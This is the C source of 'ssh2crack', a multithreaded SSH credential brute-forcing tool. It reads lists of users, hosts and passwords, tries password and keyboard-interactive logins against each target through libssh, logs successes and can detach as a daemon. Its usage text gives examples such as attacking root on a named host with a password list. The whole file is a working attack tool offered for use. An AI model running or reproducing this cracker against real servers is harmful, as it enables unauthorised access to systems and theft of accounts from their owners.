#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <libssh/libssh.h>
#include <libssh/callbacks.h>

#include "libsock.h"
#include "thread_pool.h"
#include "ssh2crack.h"

int host_list_len = 0;
int user_list_len = 0;
int passwd_list_len = 0;

int interactive_auth(ssh_session session, char *passwd)
{
	char echo = 0, *s = "blah\n";
	char *name, *instruction, *prompt;
	int x = 0, n = 0, i = 0;

	x = ssh_userauth_kbdint(session, NULL, NULL);
	while (x == SSH_AUTH_INFO) {
		name = (char *)ssh_userauth_kbdint_getname(session);
		instruction = (char *)ssh_userauth_kbdint_getinstruction(session);
		n = ssh_userauth_kbdint_getnprompts(session);
	
		for (i = 0; i < n; i++) {
			prompt = (char *)ssh_userauth_kbdint_getprompt(session, i, &echo);
			if (echo) {
				if (ssh_userauth_kbdint_setanswer(session, i, s) < 0)
					return -1;
			}
			else {
				if (ssh_userauth_kbdint_setanswer(session, i, passwd) < 0)
					return -1;
			}
		}
		x = ssh_userauth_kbdint(session, NULL, NULL);
		if (x == SSH_AUTH_SUCCESS)
			return 0;
	}

	return -1;
}

int password_auth(ssh_session session, char *passwd)
{
	int ret;

	ret = ssh_userauth_password(session, NULL, passwd);
	if (ret == SSH_AUTH_SUCCESS)
		return 0;
		
	return -1;
}


int ssh_auth_methods(ssh_session session, char *passwd)
{
	int method = 0;
	int ret = -1, x;

	x = ssh_userauth_none(session, NULL);
	method = ssh_userauth_list(session, NULL);

	if (method & SSH_AUTH_METHOD_PASSWORD) {
		ret = password_auth(session, passwd);
	}
	else if (method & SSH_AUTH_METHOD_INTERACTIVE) {
		ret = interactive_auth(session, passwd);
	}
	else {
		fprintf(stderr, "[-] Unknown authtication method.\n");
	}

	return ret;

}

int ssh2_connect(char *ip, unsigned int port, unsigned int timeout, 
		char *user, char *passwd)
{
	ssh_session session = NULL;
	const char *identity = "SUXX";
	int ret;

	session = ssh_new();
	if (!session) {
		fprintf(stderr, "[-] Create ssh session failed.\n");
		return -1;
	}

	ssh_options_set(session, SSH_OPTIONS_HOST, ip);
	ssh_options_set(session, SSH_OPTIONS_PORT, (uint16_t *)&port);
	ssh_options_set(session, SSH_OPTIONS_USER, user);
	ssh_options_set(session, SSH_OPTIONS_IDENTITY, identity);
	ssh_options_set(session, SSH_OPTIONS_TIMEOUT, &timeout);

	ret = ssh_connect(session);
	if (ret != SSH_OK) {
		//fprintf(stderr, "%s\n", ssh_get_error(session));
		ssh_free(session);
		return -1;
	}
	//fprintf(stdout, "[+] Connect %s ok.\n", ip);

	ret = ssh_auth_methods(session, passwd);

	ssh_disconnect(session);
	ssh_free(session);

	return ret;
}

SSH2CRACK_OPT *init_opt(void)
{
	SSH2CRACK_OPT *crack_opt = NULL;

	crack_opt = (SSH2CRACK_OPT *)malloc(sizeof(SSH2CRACK_OPT));
	if (!crack_opt) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}

	crack_opt->status = 0;
	crack_opt->len = 0;
	INIT_LIST_HEAD(&(crack_opt->list_head));

	return crack_opt;
}

SSH2CRACK_ARG *init_arg(void)
{
	SSH2CRACK_ARG *crack_arg = NULL;

	crack_arg = (SSH2CRACK_ARG *)malloc(sizeof(SSH2CRACK_ARG));
	if (!crack_arg) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}

	crack_arg->timeout = DEFAULT_TIMEOUT;
	crack_arg->thread_num = DEFAULT_THREAD_NUM;
	crack_arg->daemon = DEFAULT_DAEMON_STATUS;
	strcpy(crack_arg->log, DEFAULT_LOG);

	return crack_arg;
}

CRACK_USER *alloc_user_node(void)
{
	CRACK_USER *crack_node = NULL;

	crack_node = (CRACK_USER *)malloc(sizeof(CRACK_USER));
	if (!crack_node) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}
	memset((void *)crack_node, '\0', sizeof(CRACK_USER));

	return crack_node;
}


CRACK_PASSWD *alloc_passwd_node(void)
{
	return (CRACK_PASSWD *)alloc_user_node();
}

CRACK_HOST *alloc_host_node(void)
{
	CRACK_HOST *crack_node = NULL;

	crack_node = (CRACK_HOST *)malloc(sizeof(CRACK_HOST));
	if (!crack_node) {
		fprintf(stdout, "[-] Malloc failed.\n");
		return NULL;
	}
	memset((void *)crack_node, '\0', sizeof(CRACK_HOST));

	return crack_node;
}

int init_user_list(char *file, SSH2CRACK_OPT *crack_opt) 
{
	CRACK_USER *crack_node;
	FILE *fp;
	char buff[128];
	int idx = 0;

	if (!(fp = fopen(file, "r"))) {
		perror("fopen");
		return -1;
	}

	while (fgets(buff, 128 ,fp) != NULL) {
		crack_node = alloc_user_node();;
		if (!crack_node) {
			fprintf(stdout, "[-] Malloc failed.\n");
			return -1;
		}

		buff[strlen(buff) - 1] = '\0';
		crack_opt->len++;
		crack_node->index = idx++;
		strcpy(crack_node->data, buff);
		list_add_tail(&(crack_node->list), &(crack_opt->list_head));
	}

	fclose(fp);
	return 0;
}

int init_passwd_list(char *file, SSH2CRACK_OPT *crack_opt)
{
	return init_user_list(file, crack_opt);
}

int fix_host_list(struct list_head *list_head)
{
	CRACK_HOST *s = NULL;
	struct list_head *p = NULL;

	list_for_each(p, list_head) {
		s = list_entry(p, CRACK_HOST, list);
		if (s) {
			s->user_map = (unsigned int *)malloc(sizeof(int) * user_opt->len);
			if (!s->user_map)
				return -1;
			memset(s->user_map, 0, sizeof(int) * user_opt->len);
			s->total_user = user_opt->len;
		}
	}

	return 0;
}

int init_host_list(char *file, SSH2CRACK_OPT *crack_opt)
{
        CRACK_HOST *crack_node;
        FILE *fp;
        char buff[128];

        if (!(fp = fopen(file, "r"))) {
                perror("fopen");
                return -1;
        }
        //fprintf(stdout, "[+] Open %s ok.\n", file);

        while (fgets(buff, 128 ,fp) != NULL) {
                crack_node = alloc_host_node();
                if (!crack_node) {
                        fprintf(stdout, "[-] Malloc failed.\n");
                        return -1;
                }

                buff[strlen(buff) - 1] = '\0';
                crack_opt->len++;
		crack_node->current_user = 0;
                strcpy(crack_node->data, buff);
                list_add_tail(&(crack_node->list), &(crack_opt->list_head));
        }

        fclose(fp);
        return 0;
}

void print_list(struct list_head *list_head)
{
	CRACK_USER *s = NULL;
	struct list_head *p = NULL;

	list_for_each(p, list_head) {
		s = list_entry(p, CRACK_USER, list);
		if (s) {
			printf("%s\n", s->data);
		}
	}
}

void print_host_list(struct list_head *list_head)
{
	CRACK_HOST *s = NULL;
	struct list_head *p = NULL;

	list_for_each(p, list_head) {
		s = list_entry(p, CRACK_HOST, list);
		if (s) {
			printf("%s\n", s->data);
		}
	}
}

int init_log(char *path)
{
	result_fp = fopen(path, "a+");
	if (!result_fp) {
		perror("fopen");
		return -1;
	}

	pthread_mutex_init(&file_lock, NULL);
	return 0;
}

int handle_user_arg(char *optarg)
{
        CRACK_USER *node;

        memset(ssh2crack_arg->user, '\0', 64);
        strcpy(ssh2crack_arg->user, optarg);

        node = alloc_user_node();
        if (!node)
                return -1;

        user_opt->len++;
	node->index = 0;
        strcpy(node->data, ssh2crack_arg->user);
        list_add_tail(&(node->list), &(user_opt->list_head));

        return 0;
}

int handle_user_list_arg(char *optarg)
{
	memset(ssh2crack_arg->user_list, '\0', 128);
	strcpy(ssh2crack_arg->user_list, optarg);
      
	if (init_user_list(ssh2crack_arg->user_list, user_opt) == -1)
		return -1;

	return 0;
}

int handle_passwd_arg(char *optarg)
{
        CRACK_PASSWD *node;

        memset(ssh2crack_arg->passwd, '\0', 64);
        strcpy(ssh2crack_arg->passwd, optarg);

        node = alloc_passwd_node();
        if (!node)
                return -1;

        passwd_opt->len++;
        strcpy(node->data, ssh2crack_arg->passwd);
        list_add_tail(&(node->list), &(passwd_opt->list_head));

        return 0;
}

int handle_passwd_list_arg(char *optarg)
{
	memset(ssh2crack_arg->passwd_list, '\0', 128);
	strcpy(ssh2crack_arg->passwd_list, optarg);
       
	if (init_passwd_list(ssh2crack_arg->passwd_list, passwd_opt) == -1)
		return -1;
	
	return 0;
}

int handle_host_arg(char *optarg)
{
        CRACK_HOST *node;

        memset(ssh2crack_arg->host, '\0', 64);
        strcpy(ssh2crack_arg->host, optarg);

        node = alloc_host_node();
        if (!node)
                return -1;

	host_opt->len++;
	node->current_user = 0;
        strcpy(node->data, ssh2crack_arg->host);
        list_add_tail(&(node->list), &(host_opt->list_head));

        return 0;
}

int handle_host_list_arg(char *optarg)
{
	memset(ssh2crack_arg->host_list, '\0', 128);
	strcpy(ssh2crack_arg->host_list, optarg);

	if (init_host_list(ssh2crack_arg->host_list, host_opt) == -1)
		return -1;
	
	return 0;
}

void display_status(void)
{
        fprintf(stdout, "Crack engine - Host: %d | User: %d | Passwd: %d | Threads: %d | "
                        "timeout: %d| log: %s\n\n",
			host_opt->len, user_opt->len, passwd_opt->len,
                        ssh2crack_arg->thread_num, ssh2crack_arg->timeout,
                        ssh2crack_arg->log);
}

void ssh2crack_banner(void)
{
	fprintf(stdout, "%s %s\t%s - %s\n", SSH2CRACK_BANNER, 
			SSH2CRACK_VERSION, SSH2CRACK_AUTHOR, SSH2CRACK_DESC);
}

void ssh2crack_usage(char *proc_name)
{
	ssh2crack_banner();

	fprintf(stdout, "\n%s [-l USER|-L USER.lst] [-h HOST|-H HOST.lst] "
			"[-p PASSWORD|-P PASSWORD.lst] [-o log] [-t timeout]"
			" [-n threads] [-v|V] [-d]\n\n"
			"Options:\n"
			"  -l\t\tlogin user name.\n"
			"  -L\t\tlogin user file list.\n"
			"  -h\t\ttarget host.\n"
			"  -H\t\ttarget host list.\n"
			"  -p\t\tsingle password.\n"
			"  -P\t\tpassword file list.\n"
			"  -o\t\tlog file, default is log\n"
			"  -t\t\ttimeout, deafult is 5 second.\n"
			"  -n\t\tthread nums, default is 5.\n"
			"  -v|V\t\tdisplay banner information.\n"
			"  -d\t\trun as a daemon.\n"
			"\nExamples:\n"
			"  ssh2crack -l root -h www.thc.org -P pass.lst\n"
			"  ssh2crack -L user.lst -H host.lst -P pass.lst\n"
			"  ssh2crack -L user.lst -H host.lst -P pass.lst -t 5 -n 5 -d\n", 
			proc_name);
}

int main(int argc, char **argv)
{
	int c;

	if (argc == 1) {
		ssh2crack_usage(argv[0]);
		return 0;
	}

	if (!(user_opt = init_opt()) || !(host_opt = init_opt()) ||
		!(passwd_opt = init_opt()) || !(ssh2crack_arg = init_arg()))
		return -1;

	while ((c = getopt(argc, argv, "l:L:h:H:p:P:o:t:n:d:vV")) != -1) {
		switch (c) {
		case 'l':
			if (handle_user_arg(optarg) == -1)
				return -1;
			break;
		case 'L':
			if (handle_user_list_arg(optarg) == -1)
				return -1;
			break;
		case 'h':
			if (handle_host_arg(optarg) == -1)
				return -1;
			break;
		case 'H':
			if (handle_host_list_arg(optarg) == -1)
				return -1;
			break;
		case 'p':
			if (handle_passwd_arg(optarg) == -1)
				return -1;
			break;
		case 'P':
			if (handle_passwd_list_arg(optarg) == -1)
				return -1;
			break;
		case 'o':
			memset(ssh2crack_arg->log, '\0', 128);
			strcpy(ssh2crack_arg->log, optarg);
			break;
		case 't':
			ssh2crack_arg->timeout = atoi(optarg);
			break;
		case 'n':
			ssh2crack_arg->thread_num = atoi(optarg);
			break;
		case 'd':
			ssh2crack_arg->daemon = 1;
			break;
		case 'v':
		case 'V':
			ssh2crack_banner();
			return 0;
		default:
			fprintf(stderr, "[-] Wrong option.\n");
			return -1;
		}
	}	

	fix_host_list(&(host_opt->list_head));
	signal(SIGINT, handle_sigint);

	init_log(ssh2crack_arg->log);
	ssh_threads_set_callbacks(ssh_threads_get_pthread());
	ssh_init();

	display_status();
/*
	printf("----------------\n");
	print_list(&(user_opt->list_head));
	printf("----------------\n");
	print_host_list(&(host_opt->list_head));
	printf("----------------\n");
	print_list(&(passwd_opt->list_head));
	printf("----------------\n");
*/

	if (ssh2crack_arg->daemon == 1)
		daemon(0, 0);

	if (init_thread_pool(ssh2crack_arg->thread_num) == -1)
		return -1;

	if (start_add_worker_thread() == -1) 
		return -1;

	sleep(1);
	wait_all_thread_finsh();
	fclose(result_fp);

	return 0;
}
